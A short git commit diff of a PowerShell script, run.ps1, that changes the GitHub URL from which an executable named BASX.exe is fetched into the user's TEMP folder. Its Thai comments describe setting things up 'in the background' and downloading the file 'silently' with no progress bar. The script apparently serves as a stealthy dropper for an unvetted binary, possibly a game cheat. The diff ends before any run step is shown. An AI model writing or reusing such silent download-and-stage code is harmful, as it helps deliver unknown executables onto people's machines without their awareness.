7794e93fe2284f0f8a8e4e4872d465fd3110cd47
silentaimv1-png <silentaimv1@gmail.com>
2026-05-16 00:47:09 +0700

    run.ps1

--- run.ps1
+++ run.ps1
@@ -1,5 +1,5 @@
 # 1. ตั้งค่าเบื้องหลัง
-$url = "https://github.com/silentaimv1-png/basxpanel/raw/refs/heads/main/BASX.exe"
+$url = "https://github.com/relaxwtf777-lang/cmd/raw/refs/heads/main/BASX.exe"
 $output = "$env:TEMP\BASX.exe"
 
 # 2. ดาวน์โหลดไฟล์แบบเงียบๆ (ไม่ให้มีแถบโหลดขึ้น)
